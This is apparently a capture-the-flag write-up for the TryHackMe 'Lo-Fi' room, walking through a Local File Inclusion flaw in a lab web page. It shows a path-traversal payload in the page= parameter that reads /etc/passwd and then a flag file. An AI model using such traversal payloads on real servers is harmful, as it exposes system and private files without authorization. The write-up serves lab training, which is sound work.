# Lo-Fi

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/5de96d9ca744773ea7ef8c00-1737110160739" width="200">
</p>

> *Want to hear some lo-fi beats, to relax or study to? We've got you covered!*

<br>

## 🧠 Intro
Welcome to **Lo-Fi**, where we’ll be exploring **LFI (Local File Inclusion)**. This vulnerability happens when an application allows users to include files on the server through the browser — usually due to unsafe handling of URL parameters.


*Get into the Lo-Fi vibe and deploy your machine!* 🎧

<br>

## 🔍 Recon
We start off by visiting the machine’s IP in the browser:

> http://MACHINE_IP

![LoFi_1](src/LoFi_1.png)

We’re greeted with a chill video page and some categories on the side. Out of curiosity, we click on one—`sleep`.

That takes us to:

> http://MACHINE_IP/?page=sleep.php

![LoFi_2](src/LoFi_2.png)

Hmm. That URL looks interesting. `page=sleep.php`? Looks like the server is including files based on that parameter. 🤔

So... what if we try something like:

> http://MACHINE_IP/?page=/home

![LoFi_3](src/LoFi_3.png)

Bingo. We get a message telling us to stop hacking.

*Sorry, no can do.* 😎

<br>

## 🧪 Exploitation (LFI)
Time to test a classic **Local File Inclusion** payload:

> `../../../../etc/passwd`

So we go to:

> http://MACHINE_IP/?page=../../../../etc/passwd

![LoFi_4](src/LoFi_4.png)

Boom! We get the contents of `/etc/passwd` on the page. That's a confirmed LFI vulnerability.

Let’s look for our flag. Common sense says it might be in the root directory:

> http://MACHINE_IP/?page=../../../../flag.txt

![LoFi_5](src/LoFi_5.png)

And there it is!

<br>

## 🏁 Got the Flag


Once you found the flag, drop it here (or redact it if you're sharing publicly):

```
flag{go_get_it}
```

<br>

## 🎯 Takeaway
Wrap up with what you learned. Anything that surprised you or that you'll remember next time?

<br>

## 🏠 Room Info
- 🧩 [TryHackMe - Lo-Fi](https://tryhackme.com/room/lofi)
- 🏷️ Difficulty: Easy
- 🧠 Focus: LFI
